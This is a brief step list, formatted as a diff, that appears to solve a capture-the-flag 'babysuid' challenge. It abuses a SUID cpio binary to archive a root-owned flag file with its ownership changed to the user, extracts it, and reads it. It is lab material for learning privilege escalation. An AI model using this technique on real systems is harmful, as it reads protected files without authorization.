@@ -1,0 +1,7 @@
+1 Connect to terminal
+2 Read instructions : /challenge/babysuid
+3 Go to root : cd /
+3 Create archive : ls flag | cpio -o -R hacker:hacker > ~/archive.cpio
+5 Go home : cd ~
+6 Extract archive : cpio -i < archive.cpio
+7 Read file : cat flag
